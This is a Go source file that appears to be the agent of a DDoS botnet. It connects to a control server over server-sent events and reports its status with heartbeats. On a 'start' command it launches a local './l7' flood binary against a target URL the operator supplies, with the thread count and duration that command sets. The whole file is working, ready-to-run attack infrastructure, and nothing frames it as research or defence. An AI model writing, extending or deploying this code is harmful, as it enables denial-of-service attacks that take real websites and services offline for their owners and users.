// agent.go
package main

import (
	"bufio"
	"bytes"
	"context"
	"crypto/tls"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log/slog"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/signal"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
)

// ─── Types ────────────────────────────────────────────────────────────────────

type Command struct {
	Action     string `json:"action"`
	URL        string `json:"url"`
	Threads    int    `json:"threads"`
	Timer      int    `json:"timer"`
	CustomHost string `json:"custom_host"`
}

// ─── Agent ────────────────────────────────────────────────────────────────────

type Agent struct {
	controlURL string
	agentID    string
	token      string

	mu      sync.Mutex
	status  string
	currCmd *exec.Cmd
	// cancelRun cancels the currently running executeL7 context.
	// Calling it is safe even when no run is active (it's a no-op then).
	cancelRun context.CancelFunc

	httpClient *http.Client // general-purpose (short timeout)
	sseClient  *http.Client // long-lived SSE connection (no timeout)

	randSrc *rand.Rand
}

func NewAgent(controlURL, agentID, token string) *Agent {
	transport := func() *http.Transport {
		return &http.Transport{
			TLSClientConfig:   &tls.Config{InsecureSkipVerify: false}, //nolint:gosec // explicit default
			ForceAttemptHTTP2: false,
			DialContext: (&net.Dialer{
				Timeout:   10 * time.Second,
				KeepAlive: 30 * time.Second,
			}).DialContext,
		}
	}

	return &Agent{
		controlURL: controlURL,
		agentID:    agentID,
		token:      token,
		status:     "Ready",
		cancelRun:  func() {}, // no-op initially
		httpClient: &http.Client{
			Timeout:   10 * time.Second,
			Transport: transport(),
		},
		// SSE transport: no overall timeout; individual dials still time out
		sseClient: &http.Client{
			Timeout:   0,
			Transport: transport(),
		},
		randSrc: rand.New(rand.NewSource(time.Now().UnixNano())),
	}
}

// ─── Helpers ─────────────────────────────────────────────────────────────────

// validateURL ensures the URL is a well-formed http/https address.
// Agents validate independently of the control server — never trust input blindly.
func validateURL(raw string) error {
	u, err := url.ParseRequestURI(raw)
	if err != nil {
		return fmt.Errorf("malformed URL: %w", err)
	}
	if u.Scheme != "http" && u.Scheme != "https" {
		return fmt.Errorf("URL scheme must be http or https, got %q", u.Scheme)
	}
	return nil
}

// newRequest builds an authenticated request to the control server.
func (a *Agent) newRequest(ctx context.Context, method, path string, body io.Reader) (*http.Request, error) {
	req, err := http.NewRequestWithContext(ctx, method, a.controlURL+path, body)
	if err != nil {
		return nil, err
	}
	if a.token != "" {
		req.Header.Set("Authorization", "Bearer "+a.token)
	}
	return req, nil
}

// ─── Status reporting ─────────────────────────────────────────────────────────

func (a *Agent) reportStatus(ctx context.Context) {
	a.mu.Lock()
	s := a.status
	a.mu.Unlock()

	payload, _ := json.Marshal(map[string]string{"agentID": a.agentID, "status": s})
	req, err := a.newRequest(ctx, http.MethodPost, "/agent-status", bytes.NewReader(payload))
	if err != nil {
		slog.Error("build status request", "err", err)
		return
	}
	req.Header.Set("Content-Type", "application/json")

	resp, err := a.httpClient.Do(req)
	if err != nil {
		slog.Warn("status POST error", "err", err)
		return
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
}

// ─── Command execution ────────────────────────────────────────────────────────

func (a *Agent) stopCurrent() {
	a.mu.Lock()
	defer a.mu.Unlock()
	a.cancelRun() // cancel the context → exec.CommandContext kills the process
	a.cancelRun = func() {}
	a.currCmd = nil
}

func (a *Agent) executeL7(ctx context.Context, targetURL string, threads, timer int, customHost string) {
	// Validate URL on the agent side — never trust server input blindly.
	if err := validateURL(targetURL); err != nil {
		slog.Error("invalid target URL from server", "err", err)
		return
	}

	// Cancel any previously running command before starting a new one.
	a.stopCurrent()

	a.mu.Lock()
	a.status = "Sending"
	a.mu.Unlock()
	a.reportStatus(ctx)

	// Create a child context so we can cancel this run independently.
	runCtx, cancel := context.WithTimeout(ctx, time.Duration(timer)*time.Second)

	a.mu.Lock()
	a.cancelRun = cancel
	a.mu.Unlock()

	defer func() {
		cancel() // always release the context
		a.mu.Lock()
		a.status = "Ready"
		a.mu.Unlock()
		a.reportStatus(ctx)
	}()

	args := []string{targetURL, strconv.Itoa(threads), strconv.Itoa(timer)}
	if customHost != "" {
		args = append(args, customHost)
	}
	cmd := exec.CommandContext(runCtx, "./l7", args...)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	a.mu.Lock()
	a.currCmd = cmd
	a.mu.Unlock()

	if err := cmd.Start(); err != nil {
		slog.Error("l7 start error", "err", err)
		a.mu.Lock()
		a.status = "Error"
		a.mu.Unlock()
		a.reportStatus(ctx)
		return
	}

	if err := cmd.Wait(); err != nil && runCtx.Err() == nil {
		slog.Warn("l7 exited with error", "err", err)
	}
}

// ─── SSE command listener ─────────────────────────────────────────────────────

// parseSSEFrames reads SSE frames from r and sends Commands on out.
// It handles multi-line frames and ignores comment/retry lines.
// Returns when the reader returns an error (connection closed, ctx cancelled, etc.).
func parseSSEFrames(r *bufio.Reader, out chan<- Command) error {
	var eventName string
	for {
		line, err := r.ReadString('\n')
		if err != nil {
			return err
		}
		line = strings.TrimRight(line, "\r\n")

		switch {
		case line == "":
			// blank line = end of frame; reset event name
			eventName = ""

		case strings.HasPrefix(line, ":"):
			// comment / ping; ignore

		case strings.HasPrefix(line, "event:"):
			eventName = strings.TrimSpace(strings.TrimPrefix(line, "event:"))

		case strings.HasPrefix(line, "data:"):
			if eventName != "command-enqueued" {
				continue
			}
			raw := strings.TrimSpace(strings.TrimPrefix(line, "data:"))
			var cmd Command
			if err := json.Unmarshal([]byte(raw), &cmd); err != nil {
				slog.Warn("bad SSE payload", "err", err, "raw", raw)
				continue
			}
			select {
			case out <- cmd:
			default:
				slog.Warn("command channel full, dropping", "action", cmd.Action)
			}
		}
	}
}

func (a *Agent) listenForCommands(ctx context.Context) {
	backoff := 500 * time.Millisecond
	cmds := make(chan Command, 8)

	// Dispatch goroutine: handles commands from the channel so the SSE reader
	// is never blocked by a slow executeL7.
	go func() {
		for {
			select {
			case <-ctx.Done():
				return
			case cmd, ok := <-cmds:
				if !ok {
					return
				}
				switch cmd.Action {
				case "start":
					// Run in a goroutine so we don't block the dispatcher,
					// but stopCurrent() inside executeL7 serialises starts.
					go a.executeL7(ctx, cmd.URL, cmd.Threads, cmd.Timer, cmd.CustomHost)
				case "stop":
					a.stopCurrent()
					a.mu.Lock()
					a.status = "Ready"
					a.mu.Unlock()
					a.reportStatus(ctx)
				default:
					slog.Warn("unknown command action", "action", cmd.Action)
				}
			}
		}
	}()

	for {
		if ctx.Err() != nil {
			return
		}

		sseURL := fmt.Sprintf("%s/events?agentID=%s", a.controlURL, a.agentID)
		req, err := a.newRequest(ctx, http.MethodGet, "/events?agentID="+a.agentID, nil)
		if err != nil {
			slog.Error("build SSE request", "err", err, "url", sseURL)
			time.Sleep(backoff)
			continue
		}
		req.Header.Set("Accept", "text/event-stream")

		resp, err := a.sseClient.Do(req)
		if err != nil {
			jitter := time.Duration(a.randSrc.Int63n(int64(backoff / 5)))
			slog.Warn("SSE connect error, retrying", "err", err, "backoff", backoff+jitter)
			time.Sleep(backoff + jitter)
			backoff = min(backoff*2, 10*time.Second)
			continue
		}
		if resp.StatusCode != http.StatusOK {
			slog.Warn("SSE non-200", "status", resp.StatusCode)
			resp.Body.Close()
			time.Sleep(backoff)
			backoff = min(backoff*2, 10*time.Second)
			continue
		}

		slog.Info("SSE connected", "url", sseURL)
		backoff = 500 * time.Millisecond // reset on successful connect

		if err := parseSSEFrames(bufio.NewReader(resp.Body), cmds); err != nil {
			slog.Warn("SSE stream ended", "err", err)
		}
		resp.Body.Close()
	}
}

// ─── Agent ID resolution ──────────────────────────────────────────────────────

// resolveAgentID tries public IP first, then hostname, then "unknown".
func resolveAgentID(client *http.Client) string {
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	req, _ := http.NewRequestWithContext(ctx, http.MethodGet, "https://api.ipify.org?format=text", nil)
	if resp, err := client.Do(req); err == nil {
		defer resp.Body.Close()
		if b, err := io.ReadAll(resp.Body); err == nil {
			if ip := strings.TrimSpace(string(b)); ip != "" {
				return ip
			}
		}
	}

	slog.Warn("could not get public IP, falling back to hostname")
	if h, err := os.Hostname(); err == nil && h != "" {
		return h
	}
	return "unknown-agent"
}

// ─── Main ────────────────────────────────────────────────────────────────────

func main() {
	serverFlag := flag.String("server", "http://localhost:8081", "control server URL")
	flag.Parse()

	logger := slog.New(slog.NewTextHandler(os.Stderr, &slog.HandlerOptions{Level: slog.LevelInfo}))
	slog.SetDefault(logger)

	token := os.Getenv("SERVER_TOKEN")
	if token == "" {
		slog.Warn("SERVER_TOKEN not set — requests will be unauthenticated")
	}

	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
	defer stop()

	// Build a temporary client just for resolving the agent ID.
	tempClient := &http.Client{Timeout: 10 * time.Second}
	agentID := resolveAgentID(tempClient)

	agent := NewAgent(*serverFlag, agentID, token)
	slog.Info("agent starting", "agentID", agentID, "server", *serverFlag)

	// Initial heartbeat.
	agent.reportStatus(ctx)

	// SSE command listener.
	go agent.listenForCommands(ctx)

	// Periodic heartbeat — 1 s is plenty given a 3 s offline timeout.
	go func() {
		t := time.NewTicker(1 * time.Second)
		defer t.Stop()
		for {
			select {
			case <-ctx.Done():
				return
			case <-t.C:
				agent.reportStatus(ctx)
			}
		}
	}()

	// Block until signal.
	<-ctx.Done()
	slog.Info("shutting down")

	// Kill any running l7 process gracefully.
	agent.stopCurrent()
	slog.Info("stopped")
}

// min is a helper for Go versions before 1.21 that don't have builtin min.
func min(a, b time.Duration) time.Duration {
	if a < b {
		return a
	}
	return b
}
